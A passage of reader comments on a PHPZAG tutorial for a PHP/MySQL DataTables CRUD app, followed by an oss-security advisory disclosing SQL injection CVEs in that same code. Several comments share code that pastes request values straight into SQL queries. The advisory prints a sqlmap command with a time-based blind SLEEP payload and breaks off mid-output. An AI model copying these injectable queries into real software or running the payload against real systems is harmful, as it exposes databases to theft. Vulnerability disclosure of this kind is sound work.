    when I goto class/Records2.php i edit the following:

    public function listRecords(){

    $sqlQuery = “SELECT \* FROM “.$this->recordsTable.” “;

    with

    public function listRecords(){

    $sqlQuery = “SELECT \* FROM “.$this->recordsTable.” WHERE group\_id=”.$\_GET[‘group\_id’].” “;

    But it gives me error, however when I put a value instead of the GET it lists the records correctly for the value.

    please can you explain what I have done wrong.

    [Reply](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/?replytocom=169305#respond)
    1. ![](https://secure.gravatar.com/avatar/b48bdfd003e219f94ac2079f9a96347f?s=60&d=mm&r=g) **PHPZAG Team** says:
       [21 November, 2020 at 8:55 am](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/#comment-169389)

       Try to debug by printing GET value outside query or you can print query to know the cause of issue. thanks!

       [Reply](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/?replytocom=169389#respond)
29. ![](https://secure.gravatar.com/avatar/5efe0619f79ef06588c642382cd66b30?s=60&d=mm&r=g) **Jacob** says:
    [9 December, 2020 at 11:10 pm](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/#comment-169625)

    When I input manually data it appear, but I can’t edit it and add new record. The only thing which is working is delete button – it really delete this from database

    [Reply](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/?replytocom=169625#respond)
31. ![](https://secure.gravatar.com/avatar/d3ccf76003e4a59e5398b7e4b928431a?s=60&d=mm&r=g) **buqfox** says:
    [25 February, 2021 at 2:41 am](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/#comment-170989)

    Many Thanks for the tutorial.

    Btw I found a glitch, when I sort column “age” it actually sorting “name” not “age”.

    and if I sort “name” it sorting “id” instead of “name”.

    this only affect column “age” and “name”, others column sort just right.

    how to fixed that?

    [Reply](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/?replytocom=170989#respond)
    1. ![](https://secure.gravatar.com/avatar/b48bdfd003e219f94ac2079f9a96347f?s=60&d=mm&r=g) **PHPZAG Team** says:
       [20 March, 2021 at 4:42 am](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/#comment-171468)

       I am checking this and update. thanks!

       [Reply](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/?replytocom=171468#respond)
       1. ![](https://secure.gravatar.com/avatar/85dcca562c72d66128cb160949d884ce?s=60&d=mm&r=g) **Piyaruj Chaisuk** says:
          [12 May, 2021 at 4:38 pm](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/#comment-172156)

          Add this array into function listRecords

          $columns = array(‘id’, ‘name’,’age’,’skills’,’address’,’designation’);

          and fix this in if(!empty($\_POST[“order”]))

          $sqlQuery .= ‘ORDER BY ‘.$columns[$\_POST[‘order’][‘0’][‘column’]].’ ‘.$\_POST[‘order’][‘0’][‘dir’].’ ‘;

          [Reply](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/?replytocom=172156#respond)
33. ![](https://secure.gravatar.com/avatar/cd08eddcf77f4679f848977ce1d8e9e6?s=60&d=mm&r=g) **Ron** says:
    [31 March, 2021 at 3:01 pm](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/#comment-171602)

    Great tutorial! In reference to column sorting, it seems when serverside=true column numbering is 1,2,etc vice serverside = false where column numbering is 0,1,etc. Below is what I changed in the “Inventory” example in category.js. Now my inventory category example sorts on the column heading I select. I would assume the others (product.js, customer.js, etc) would be the same. However, in the “Inventory” example I am working on pagination with serverside=true. No luck yet. Hope this helps. I am new to all this. If I am off base on this, please advise. Thank you.

    “columnDefs”:[

    { “orderData”:[ 3 ],”targets”: 2 },

    { “orderData”:[ 2 ],”targets”: 1 },

    { “orderData”:[ 1 ],”targets”: 0 },

    {

    “targets”:[3, 4],

    “orderable”:false,

    },

    ],

    [Reply](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/?replytocom=171602#respond)
    1. ![](https://secure.gravatar.com/avatar/85dcca562c72d66128cb160949d884ce?s=60&d=mm&r=g) **Piyaruj Chaisuk** says:
       [12 May, 2021 at 4:40 pm](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/#comment-172157)

       The owner of the code forgot to add the array into the server side query.

       Add this array into function listRecords

       $columns = array(‘id’, ‘name’,’age’,’skills’,’address’,’designation’);

       and fix this in if(!empty($\_POST[“order”]))

       $sqlQuery .= ‘ORDER BY ‘.$columns[$\_POST[‘order’][‘0’][‘column’]].’ ‘.$\_POST[‘order’][‘0’][‘dir’].’ ‘;

       [Reply](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/?replytocom=172157#respond)
35. ![](https://secure.gravatar.com/avatar/b058e961d4a5dd25376ae1955ea64b06?s=60&d=mm&r=g) **julio1501** says:
    [9 June, 2021 at 8:33 am](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/#comment-172743)

    Hi,

    my existing database has 15 columns and the ID column as primary key is not auto increment. What changes do I have to make?

    Thanks for this great job!

    [Reply](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/?replytocom=172743#respond)
    1. ![](https://secure.gravatar.com/avatar/b48bdfd003e219f94ac2079f9a96347f?s=60&d=mm&r=g) **PHPZAG Team** says:
       [15 August, 2021 at 6:48 am](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/#comment-174377)

       You need to make column auto-increment by alter query.

       For example:

       ALTER TABLE `tablename` MODIFY `ID` INT AUTO\_INCREMENT PRIMARY KEY;

       [Reply](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/?replytocom=174377#respond)
37. ![](https://secure.gravatar.com/avatar/9186153c38c6a59984d071ea803f4bc3?s=60&d=mm&r=g) **gladson** says:
    [16 June, 2021 at 1:17 pm](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/#comment-172892)

    Great work! when i click update the pop up come only with name other filled are empty how to fix

    [Reply](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/?replytocom=172892#respond)
    1. ![](https://secure.gravatar.com/avatar/b48bdfd003e219f94ac2079f9a96347f?s=60&d=mm&r=g) **PHPZAG Team** says:
       [7 August, 2021 at 5:09 pm](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/#comment-174135)

       Try to debug, may there error. thanks!

       [Reply](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/?replytocom=174135#respond)
39. ![](https://secure.gravatar.com/avatar/d8aecb2f14e51572535b6ff173dc3725?s=60&d=mm&r=g) **vinit** says:
    [15 July, 2021 at 11:07 am](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/#comment-173565)

    How to change value of pagination from 10 to 20

    [Reply](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/?replytocom=173565#respond)
    1. ![](https://secure.gravatar.com/avatar/b48bdfd003e219f94ac2079f9a96347f?s=60&d=mm&r=g) **PHPZAG Team** says:
       [7 August, 2021 at 3:45 pm](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/#comment-174122)

       You can check “pageLength” in ajax.js to change value as per your requirement. thanks!

       [Reply](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/?replytocom=174122#respond)
41. ![](https://secure.gravatar.com/avatar/9fce3a32c9a214b87d3726dfaf6ae87e?s=60&d=mm&r=g) **MBA** says:
    [29 July, 2021 at 2:39 am](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/#comment-173852)

    The search is not working on my end… can you anyone help?

    I get this error Fatal error: Call to a member function execute() on a non-object

    [Reply](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/?replytocom=173852#respond)
    1. ![](https://secure.gravatar.com/avatar/b48bdfd003e219f94ac2079f9a96347f?s=60&d=mm&r=g) **PHPZAG Team** says:
       [7 August, 2021 at 3:37 pm](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/#comment-174115)

       Checking this and update you, thanks!

       [Reply](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/?replytocom=174115#respond)
43. ![](https://secure.gravatar.com/avatar/a4e563266fe079991d97707a48a1db3b?s=60&d=mm&r=g) **debashish** says:
    [1 August, 2021 at 12:28 am](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/#comment-173926)

    I am unable to download this. Please help

    [Reply](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/?replytocom=173926#respond)
    1. ![](https://secure.gravatar.com/avatar/b48bdfd003e219f94ac2079f9a96347f?s=60&d=mm&r=g) **PHPZAG Team** says:
       [7 August, 2021 at 3:37 pm](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/#comment-174114)

       it’s fixed, you can download from download link in tutorial. thanks!

       [Reply](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/?replytocom=174114#respond)
       1. ![](https://secure.gravatar.com/avatar/aa586df638ddbaceec7a9bd17b777ad6?s=60&d=mm&r=g) **Marco** says:
          [13 November, 2021 at 10:41 pm](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/#comment-176426)

          Please, Ordering in columns name and age are not ok. When i order by name, it orders by id. And age orders by name.. !

          [Reply](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/?replytocom=176426#respond)
45. ![](https://secure.gravatar.com/avatar/c73c00a04b09dc0fe948b4fb2ebb0fd9?s=60&d=mm&r=g) **Ashutosh** says:
    [1 August, 2021 at 12:33 am](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/#comment-173927)

    Both demo and Download keeps redirecting to different advert pages

    [Reply](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/?replytocom=173927#respond)
    1. ![](https://secure.gravatar.com/avatar/b48bdfd003e219f94ac2079f9a96347f?s=60&d=mm&r=g) **PHPZAG Team** says:
       [7 August, 2021 at 3:37 pm](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/#comment-174113)

       it’s fixed, you can download from download link in tutorial. thanks!

       [Reply](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/?replytocom=174113#respond)
47. ![](https://secure.gravatar.com/avatar/fc802420a7a6bc7620de82b65402b7a4?s=60&d=mm&r=g) **Michal** says:
    [14 November, 2021 at 6:44 pm](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/#comment-176528)

    Good job! Thanks!

    I have one question – how to hide Id column ?

    [Reply](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/?replytocom=176528#respond)
49. ![](https://secure.gravatar.com/avatar/4923ea249f7730088b7708c22a519924?s=60&d=mm&r=g) **[Mike M](http://www.linechartbuilder.com)** says:
    [12 February, 2022 at 1:19 am](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/#comment-178627)

    Hi, I am trying to add my own fields to my own database…I am missing something. Any help is greatly appreciated!

    if($this->id) {

    $stmt = $this->conn->prepare(”

    UPDATE “.$this->recordsTable.”

    SET playerNum= ?, firstName = ?, lastName = ?, playerDOB = ?, homeTown = ?, height = ?, weight = ?, shot = ?

    WHERE id = ?”);

    $this->id = htmlspecialchars(strip\_tags($this->id));

    $this->playerNum = htmlspecialchars(strip\_tags($this->playerNum));

    $this->firstName = htmlspecialchars(strip\_tags($this->firstName));

    $this->lastName = htmlspecialchars(strip\_tags($this->lastName));

    $this->playerDOB = htmlspecialchars(strip\_tags($this->playerDOB));

    $this->homeTown = htmlspecialchars(strip\_tags($this->homeTown));

    $this->height = htmlspecialchars(strip\_tags($this->height));

    $this->weight = htmlspecialchars(strip\_tags($this->weight));

    $this->shot = htmlspecialchars(strip\_tags($this->shot));

    $stmt->bind\_param(“issssssss”, $this->id, $this->playerNum, $this->firstName, $this->lastName, $this->playerDOB, $this->homeTown, $this->height, $this->weight, $this->shot);

    if($stmt->execute()){

    return true;

    }

    [Reply](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/?replytocom=178627#respond)
51. ![](https://secure.gravatar.com/avatar/99c20b2f8906382b9ddbb8048465ad19?s=60&d=mm&r=g) **[Jan Kowalski](http://none)** says:
    [15 March, 2022 at 12:04 pm](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/#comment-179560)

    Hello, i have one question. I want to add polish language to datatable. Where can i put this code?

    $(“#recordListing”).DataTable( {

    “language”: {

    “url”: “//cdn.datatables.net/plug-ins/1.11.5/i18n/pl.json”

    }

    } );

    [Reply](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/?replytocom=179560#respond)
53. ![](https://secure.gravatar.com/avatar/667be3f99f02e043629c817ed085abba?s=60&d=mm&r=g) **Jb** says:
    [7 June, 2022 at 2:50 pm](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/#comment-181964)

    Thank for your code, is working,

    how to add field for searching, i try to add more

    $sqlQuery = “SELECT \* FROM “.$this->recordsTable.” “;

    if(!empty($\_POST[“search”][“value”])){

    $sqlQuery .= ‘where (id LIKE “%’.$\_POST[“search”][“value”].’%” ‘;

    $sqlQuery .= ‘ OR name LIKE “%’.$\_POST[“search”][“value”].’%” ‘;

    $sqlQuery .= ‘ OR age LIKE “%’.$\_POST[“search”][“value”].’%” ‘;

    $sqlQuery .= ‘ OR address LIKE “%’.$\_POST[“search”][“value”].’%” ‘;

    $sqlQuery .= ‘ OR skills LIKE “%’.$\_POST[“search”][“value”].’%”) ‘;

    but i gtt error

    DataTables warning: table id=recordListing – Invalid JSON response. For more information about this error, please see <http://datatables.net/tn/1>

    [Reply](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/?replytocom=181964#respond)
55. ![](https://secure.gravatar.com/avatar/023898aeda28c8c8e6aad5b37ee2caa8?s=60&d=mm&r=g) **jan** says:
    [9 June, 2022 at 8:55 am](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/#comment-182009)

    thank you for this tut. unfortunatly i’m not able to run it on my testsystem.

    even when i try to run it without any changes (with exception the Database changes) i allways get this error: DataTables warning: table id=recordListing – Invalid JSON response

    [Reply](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/?replytocom=182009#respond)
    1. ![](https://secure.gravatar.com/avatar/b48bdfd003e219f94ac2079f9a96347f?s=60&d=mm&r=g) **PHPZAG Team** says:
       [23 July, 2022 at 7:53 am](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/#comment-184492)

       Check may be there issue with getting data from DB, thanks!

       [Reply](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/?replytocom=184492#respond)
57. ![](https://secure.gravatar.com/avatar/ef5147e5a92e570ace882fc2391c3d21?s=60&d=mm&r=g) **Ken** says:
    [25 July, 2022 at 3:01 pm](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/#comment-184612)

    Where does this code appear?:-

    $record = new Records();

    if(!empty($\_POST[‘action’]) && $\_POST[‘action’] == ‘listRecords’) {

    $record->listRecords();

    }

    My code editor (Visual Studio Code) cannot find it in any of the files included in the download!

    [Reply](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/?replytocom=184612#respond)
    1. ![](https://secure.gravatar.com/avatar/b48bdfd003e219f94ac2079f9a96347f?s=60&d=mm&r=g) **PHPZAG Team** says:
       [30 July, 2022 at 12:17 pm](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/#comment-184976)

       its in ajax\_action.php file. thanks

       [Reply](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/?replytocom=184976#respond)
59. ![](https://secure.gravatar.com/avatar/ef5147e5a92e570ace882fc2391c3d21?s=60&d=mm&r=g) **Ken** says:
    [25 July, 2022 at 3:31 pm](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/#comment-184613)

    From the downloaded files I get “cannot be found” using the search facility in VCE:-

    deleteRecord() Does not apear in Records.php

    $(“#recordListing”).on(‘click’, ‘.update’, function()

    public function updateRecord()

    $(“#recordListing”).on(‘click’, ‘.delete’, function()

    public function deleteRecord()

    public function addRecord()

    $(“#recordModal”).on(‘submit’,’#recordForm’, function(event)

    public function listRecords()

    var dataRecords = $(‘#recordListing’).DataTable(

    All the above functions and methods are shown on the web page but do not appear in the downloaded package!

    Would appreciate some help in getiing this code sorted please?

    [Reply](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/?replytocom=184613#respond)
    1. ![](https://secure.gravatar.com/avatar/b48bdfd003e219f94ac2079f9a96347f?s=60&d=mm&r=g) **PHPZAG Team** says:
       [30 July, 2022 at 12:13 pm](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/#comment-184974)

       Just checked, its all files with code avaible in download zip file.

       [Reply](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/?replytocom=184974#respond)
61. ![](https://secure.gravatar.com/avatar/dd33fb69c0d21a105f426803f3e8ae3f?s=60&d=mm&r=g) **Paple** says:
    [28 July, 2022 at 3:25 pm](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/#comment-184889)

    how can i display more 10 rows ?

    Good job

    [Reply](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/?replytocom=184889#respond)
    1. ![](https://secure.gravatar.com/avatar/b48bdfd003e219f94ac2079f9a96347f?s=60&d=mm&r=g) **PHPZAG Team** says:
       [30 July, 2022 at 12:01 pm](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/#comment-184972)

       you can change value of “pageLength” when initialize datatables.

       [Reply](https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/?replytocom=184972#respond)

### Leave a Reply [Cancel reply](/live-add-edit-delete-datatables-records-with-ajax-php-mysql/#respond)

Your email address will not be published. Required fields are marked \*

Comment \*

Name \*

Email \*

Website

 Save my name, email, and website in this browser for the next time I comment.

Δ

# Post navigation

 [Email Subscription System with PHP & MySQL](https://www.phpzag.com/email-subscription-system-with-php-mysql/)[Build Instant Search with Ajax, PHP & MySQL](https://www.phpzag.com/build-instant-search-with-ajax-php-mysql/)

Subscribe my updates via **Email**

* [*Facebook*](https://www.facebook.com/Phpzag-203097989797749/)
* [*Twitter*](https://twitter.com/phpzag)
* [*Google Plus*](https://plus.google.com/112450781644946967938/posts)
* [*Feed*](http://feeds.feedburner.com/phpzag/)

### Popular Search Tags

[AngularJS](https://www.phpzag.com/category/tutorials/angularjs/)
[API](https://www.phpzag.com/category/resources-reviews/)
[Articles](https://www.phpzag.com/category/articles/)
[Code Snippets](https://www.phpzag.com/category/snippets/)
[HTML5](https://www.phpzag.com/category/tutorials/html5-tutorial/)
[Interview Questions](https://www.phpzag.com/category/interview-questions/)
[Javascript](https://www.phpzag.com/category/tutorials/javascript-2/)
[JQuery](https://www.phpzag.com/category/tutorials/jquery/)
[Laravel](https://www.phpzag.com/category/tutorials/laravel/)
[Magento](https://www.phpzag.com/category/tutorials/magento/)
[MYSQL](https://www.phpzag.com/category/tutorials/mysql/)
[Payment Gateways](https://www.phpzag.com/category/tutorials/payment-gateways/)
[PHP](https://www.phpzag.com/category/tutorials/php-tutorial-2/)
[Tutorials](https://www.phpzag.com/category/tutorials/)
[Wordpress](https://www.phpzag.com/category/tutorials/wordpress/)

### Latest Tutorials

* [Responsive vs. Static: Why Your HTML Editor Needs to Adapt](https://www.phpzag.com/responsive-vs-static-why-your-html-editor-needs-to-adapt/)
  28 November, 2024
* [How to Securely Share Files with Quick Upload Options](https://www.phpzag.com/how-to-securely-share-files-with-quick-upload-options/)
  20 November, 2024
* [Build Advanced AI Chatbot Using OpenAI, HTML, CSS, JavaScript](https://www.phpzag.com/build-advanced-ai-chatbot-using-openai-html-css-javascript/)
  10 November, 2024
* [Build RealTime Chat App with Laravel and WebSockets](https://www.phpzag.com/build-realtime-chat-app-with-laravel-and-websockets/)
  11 October, 2024
* [Build Live Chat System with Ajax, PHP & MySQL](https://www.phpzag.com/build-live-chat-system-with-ajax-php-mysql/)
  22 September, 2024

### Popular Tags

[AngularJS](https://www.phpzag.com/category/tutorials/angularjs/)
[API](https://www.phpzag.com/category/resources-reviews/)
[Articles](https://www.phpzag.com/category/articles/)
[Code Snippets](https://www.phpzag.com/category/snippets/)
[HTML5](https://www.phpzag.com/category/tutorials/html5-tutorial/)
[Interview Questions](https://www.phpzag.com/category/interview-questions/)
[Javascript](https://www.phpzag.com/category/tutorials/javascript-2/)
[JQuery](https://www.phpzag.com/category/tutorials/jquery/)
[Laravel](https://www.phpzag.com/category/tutorials/laravel/)
[Magento](https://www.phpzag.com/category/tutorials/magento/)
[MYSQL](https://www.phpzag.com/category/tutorials/mysql/)
[Payment Gateways](https://www.phpzag.com/category/tutorials/payment-gateways/)
[PHP](https://www.phpzag.com/category/tutorials/php-tutorial-2/)
[Tutorials](https://www.phpzag.com/category/tutorials/)
[Wordpress](https://www.phpzag.com/category/tutorials/wordpress/)

Copyright © 2011 - 2024 [PHPZAG.COM](https://www.phpzag.com/ "PHPZAG.COM") All rights reserved. | [About](https://www.phpzag.com/about/ "about") | [Contact](https://www.phpzag.com/contact/ "contact") | [Advertise](https://www.phpzag.com/advertise/ "Advertise") |
[Privacy Policy](https://www.phpzag.com/privacy)



=== Content from www.openwall.com_df856103_20250119_115750.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Hash Suite - Windows password security audit tool. GUI, reports in PDF.](https://hashsuite.openwall.net) | | --- | |
| --- | --- |

[[<prev]](../../../2020/07/08/1) [[next>]](2) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <0612DFF1-F44E-4A33-9AC7-F5681B597AAB@me.com>
Date: Thu, 09 Jul 2020 09:27:13 -0400
From: "Larry W. Cashdollar" <larry0@...com>
To: Open Security <oss-security@...ts.openwall.com>
Subject: SQL Injection in search field of phpzag live add edit delete data
 tables records with ajax php mysql

SQL Injection in search field of phpzag live add edit delete data tables records with ajax php mysql
Author: Larry W. Cashdollar, @_larry0
Date: 2020-05-19
CVE-ID:[CVE-2020-8519][CVE- 2020-8520][CVE- 2020-8521]
Download Site: <https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/>
Vendor: PHPZAG
Vendor Notified: 2020-05-19
Advisory: <http://www.vapidlabs.com/advisory.php?v=213>
Description: DataTables is a jQuery JavaScript library to convert simple HTML tables to dynamic feature-rich tables. The jQuery DataTables are very user friendly to list records with live add, edit, delete records without page refresh. Due to this, DataTables used widely in web applications to list records.

Vulnerability:
There is SQL injection in the search function in Records.php:

CVE-2020-8519 SQL injection in search parameter:

 20     if(!empty($_POST["search"]["value"])){
 21                         $sqlQuery .= 'where(id LIKE "%'.$_POST["search"]["value"].'%" ';
 22                         $sqlQuery .= ' OR name LIKE "%'.$_POST["search"]["value"].'%" ';
 23                         $sqlQuery .= ' OR designation LIKE "%'.$_POST["search"]["value"].'%" ';
 24                         $sqlQuery .= ' OR address LIKE "%'.$_POST["search"]["value"].'%" ';
 25                         $sqlQuery .= ' OR skills LIKE "%'.$_POST["search"]["value"].'%") ';
 26                 }
 27

CVE-2020-8520  SQL Injection in line 29 with 'order' and 'column' parameter:

 28                 if(!empty($_POST["order"])){
 29                         $sqlQuery .= 'ORDER BY '.$_POST['order']['0']['column'].' '.$_POST['order']['0']['dir'].' ';
 30                 } else {
 31                         $sqlQuery .= 'ORDER BY id DESC ';
 32                 }

CVE-2020-8521 SQL Injection line 35 with 'start' and 'length' parameters:

 34                 if($_POST["length"] != -1){
 35                         $sqlQuery .= 'LIMIT ' . $_POST['start'] . ', ' . $_POST['length'];
 36                 }
Exploit Code:
$ sqlmap -u "<http://192.168.0.149/live-add-edit-delete-datatables-php-mysql-demo/ajax_action.php>" --data "draw=153&columns[0][data]=0&columns[0][name]=&columns[0][searchable]=true&columns[0][orderable]=false&columns[0][search][value]=&columns[0][search][regex]=false&columns[1][data]=1&columns[1][name]=&columns[1][searchable]=true&columns[1][orderable]=true&columns[1][search][value]=&columns[1][search][regex]=false&columns[2][data]=2&columns[2][name]=&columns[2][searchable]=true&columns[2][orderable]=true&columns[2][search][value]=&columns[2][search][regex]=false&columns[3][data]=3&columns[3][name]=&columns[3][searchable]=true&columns[3][orderable]=true&columns[3][search][value]=&columns[3][search][regex]=false&columns[4][data]=4&columns[4][name]=&columns[4][searchable]=true&columns[4][orderable]=true&columns[4][search][value]=&columns[4][search][regex]=false&columns[5][data]=5&columns[5][name]=&columns[5][searchable]=true&columns[5][orderable]=true&columns[5][search][value]=&columns[
 5][search][regex]=false&columns[6][data]=6&columns[6][name]=&columns[6][searchable]=true&columns[6][orderable]=false&columns[6][search][value]=&columns[6][search][regex]=false&columns[7][data]=7&columns[7][name]=&columns[7][searchable]=true&columns[7][orderable]=false&columns[7][search][value]=&columns[7][search][regex]=false&order[0][column]=3&order[0][dir]=asc&start=0&length=10&search[value]="+and+"1&search[regex]=false&action=listRecords" -p "search[value]" --method POST --dbms=mysql --level 2 --risk 2
.
.
[10:39:53] [INFO] POST parameter 'search[value]' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (2) and risk (2) values? [Y/n] y
[10:40:00] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[10:40:00] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[10:40:00] [INFO] target URL appears to be UNION injectable with 6 columns
[10:40:00] [INFO] POST parameter 'search[value]' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
POST parameter 'search[value]' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
sqlmap identified the following injection point(s) with a total of 203 HTTP(s) requests:
---
Parameter: search[value] (POST)
    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: draw=153&columns[0][data]=0&columns[0][name]=&columns[0][searchable]=true&columns[0][orderable]=false&columns[0][search][value]=&columns[0][search][regex]=false&columns[1][data]=1&columns[1][name]=&columns[1][searchable]=true&columns[1][orderable]=true&columns[1][search][value]=&columns[1][search][regex]=false&columns[2][data]=2&columns[2][name]=&columns[2][searchable]=true&columns[2][orderable]=true&columns[2][search][value]=&columns[2][search][regex]=false&columns[3][data]=3&columns[3][name]=&columns[3][searchable]=true&columns[3][orderable]=true&columns[3][search][value]=&columns[3][search][regex]=false&columns[4][data]=4&columns[4][name]=&columns[4][searchable]=true&columns[4][orderable]=true&columns[4][search][value]=&columns[4][search][regex]=false&columns[5][data]=5&columns[5][name]=&columns[5][searchable]=true&columns[5][orderable]=true&columns[5][search][value]=&columns[5][search][regex]=false&columns[6][data]=6&columns[6][name]=&columns[6][searchable]=true&colu
 mns[6][orderable]=false&columns[6][search][value]=&columns[6][search][regex]=false&columns[7][data]=7&columns[7][name]=&columns[7][searchable]=true&columns[7][orderable]=false&columns[7][search][value]=&columns[7][search][regex]=false&order[0][column]=3&order[0][dir]=asc&start=0&length=10&search[value]= and 1") AND (SELECT * FROM (SELECT(SLEEP(5)))KGDc) AND ("Aejs"="Aejs&search[regex]=false&action=listRecords

    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
